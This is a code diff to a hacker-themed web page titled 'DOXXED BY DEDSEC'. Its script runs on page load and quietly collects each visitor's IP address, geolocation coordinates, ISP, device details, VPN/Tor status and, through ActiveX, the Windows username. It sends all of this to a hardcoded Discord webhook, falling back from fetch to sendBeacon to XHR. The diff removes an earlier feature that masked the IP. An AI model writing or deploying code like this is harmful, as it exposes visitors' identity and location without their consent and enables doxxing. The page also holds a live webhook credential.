@@ -48,11 +48,31 @@
             z-index: 10;
             pointer-events: none;
         }
+        #status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #00ff00;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            z-index: 999;
+            border: 1px solid #00ff00;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        #status.error {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
     </style>
 </head>
 <body>
 
-    <div class="texto-no-interactivo">REGARDS FROM DEDSEC</div>
+    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
@@ -61,25 +81,38 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
+    <div id="status">⏳ Initializing...</div>
+
 <script>
     // ================================================================
-    //  WEBHOOK
+    //  WEBHOOK (your new one)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
+    // Status update
+    function setStatus(text, isError = false) {
+        const el = document.getElementById('status');
+        if (el) {
+            el.textContent = text;
+            el.style.color = isError ? '#ff4444' : '#00ff00';
+            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
+        }
+    }
+
     // ================================================================
-    //  ULTRA FAST IP FETCH (300ms timeout)
+    //  GET IP WITH AGGRESSIVE TIMEOUT (1.5s)
     // ================================================================
-    function getIPWithTimeout(timeout = 300) {
+    function getIPWithTimeout(timeout = 1500) {
         return Promise.race([
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(400) })
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
                 .then(res => res.json())
                 .then(data => {
                     if (data.ip) return data;
                     throw new Error('No IP');
                 })
                 .catch(() => {
-                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(400) })
+                    // fallback to ip-api.com
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
                         .then(res => res.json())
                         .then(data => {
                             if (data.query) {
@@ -102,32 +135,69 @@
     }
 
     // ================================================================
-    //  VPN / TOR DETECTION (instant heuristics)
+    //  ENHANCED TOR / VPN DETECTION
     // ================================================================
     function detectTorOrVpnByBrowser(ua) {
+        // 1. Check User-Agent for known Tor or anonymous strings
         if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
+
+        // 2. Check navigator.webdriver – Tor Browser sets this to true
         if (navigator.webdriver === true) return true;
+
+        // 3. Check if it's a Firefox-based browser without Chrome – typical Tor pattern
+        if (ua.includes('Firefox') && !ua.includes('Chrome') && ua.includes('rv:')) {
+            // This could be Tor or regular Firefox, but combined with other checks
+            // We'll only count it if we also have no local IP (will be checked later)
+            // We'll set a flag and combine later.
+            // For now, we don't rely solely on this.
+        }
         return false;
     }
 
-    // ================================================================
-    //  GENERATE FAKE ENCRYPTED IPv6
-    // ================================================================
-    function generateFakeIPv6() {
-        const segments = [];
-        for (let i = 0; i < 8; i++) {
-            segments.push(Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0'));
-        }
-        return segments.join(':');
+    function detectViaWebRTC() {
+        return new Promise((resolve) => {
+            let hasRealIP = false;
+            let pc = null;
+            try {
+                pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) {
+                        pc.close();
+                        resolve(hasRealIP);
+                        return;
+                    }
+                    const parts = e.candidate.candidate.split(' ');
+                    if (parts.length > 7) {
+                        const ip = parts[4];
+                        // Real IP: not 0.0.0.0, not ::, not 127.0.0.1 (loopback), and not a private range? We'll just check for non-zero.
+                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
+                            hasRealIP = true;
+                        }
+                    }
+                };
+                setTimeout(() => {
+                    if (pc) pc.close();
+                    resolve(hasRealIP);
+                }, 2000);
+            } catch (e) {
+                // If WebRTC is completely blocked, treat as no real IP
+                resolve(false);
+            }
+        });
     }
 
     // ================================================================
-    //  SEND MESSAGE (fastest method: fetch + sendBeacon + XHR)
+    //  SEND MESSAGE VIA MULTIPLE METHODS
     // ================================================================
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
 
+            // Method 1: fetch
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -139,11 +209,13 @@
                 else throw new Error('fetch failed');
             })
             .catch(() => {
+                // Method 2: sendBeacon
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                 if (navigator.sendBeacon(WEBHOOK, blob)) {
                     sent = true;
                     resolve(true);
                 } else {
+                    // Method 3: XMLHttpRequest (old school)
                     try {
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', WEBHOOK, true);
@@ -156,22 +228,25 @@
                             }
                         };
                         xhr.onerror = function() { resolve(false); };
-                        setTimeout(() => resolve(false), 1500);
+                        setTimeout(() => resolve(false), 3000);
                     } catch (e) {
                         resolve(false);
                     }
                 }
             });
-
-            setTimeout(() => resolve(sent), 800);
+            // fallback timeout
+            setTimeout(() => resolve(sent), 5000);
         });
     }
 
     // ================================================================
-    //  MAIN (runs immediately, no UI feedback)
+    //  MAIN
     // ================================================================
     (async function() {
         try {
+            setStatus('Gathering system info...');
+
+            // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -202,21 +277,33 @@
 
             let battery = 'Unavailable';
             try {
-                battery = await Promise.race([
-                    navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
-                    new Promise(res => setTimeout(() => res('Unavailable'), 100))
-                ]);
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
             } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- VPN detection (instant) ----
+            // Windows username (ActiveX)
+            let winUser = 'Not available (IE/ActiveX required)';
+            try {
+                const wsh = new ActiveXObject('WScript.Shell');
+                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+            } catch (e) {}
+
+            // ---- 2. Detect VPN/Tor via browser heuristics (before IP) ----
             let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // ---- IP fetch (ultra fast) ----
-            const ipData = await getIPWithTimeout(300);
+            // Also check WebRTC local IPs to see if they are hidden (common in VPNs/Tor)
+            const hasRealLocalIP = await detectViaWebRTC();
+            if (!hasRealLocalIP) {
+                isVpn = true;
+            }
 
-            // Refine VPN detection using IP data
+            // ---- 3. Get IP (with timeout, but we will send even if it fails) ----
+            setStatus('Fetching IP...');
+            const ipData = await getIPWithTimeout(1500);
+
+            // ---- 4. Refine VPN detection using IP data (if available) ----
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -226,27 +313,19 @@
                 }
             }
 
-            // ---- Decide final IP display ----
-            let ip, isp, location, coords;
-            if (isVpn || !ipData) {
-                ip = generateFakeIPv6();
-                isp = 'FranTech Solutions';
-                location = 'Encrypted Location';
-                coords = 'Hidden';
-            } else {
-                ip = ipData.ip;
-                isp = ipData.org;
-                location = ipData.city + ', ' + ipData.region + ', ' + ipData.country_name;
-                coords = ipData.latitude + ', ' + ipData.longitude;
-            }
+            // ---- 5. Build message ----
+            const ip = ipData ? ipData.ip : 'Unknown';
+            const isp = ipData ? ipData.org : 'Unknown ISP';
+            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
+            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
 
-            // ---- Build message (no User Name line) ----
             const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
+**Windows Username:** ${winUser}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
@@ -258,11 +337,18 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- Send immediately ----
-            await sendMessage(msg);
+            // ---- 6. Send immediately (no more waiting) ----
+            setStatus('Sending...');
+            const sent = await sendMessage(msg);
+
+            if (sent) {
+                setStatus('✅ Cookies Saved!');
+            } else {
+                setStatus('❌ Send failed – check webhook', true);
+            }
 
         } catch (err) {
-            // Silently swallow errors – no UI feedback
+            setStatus('❌ Error: ' + err.message, true);
             console.error(err);
         }
     })();
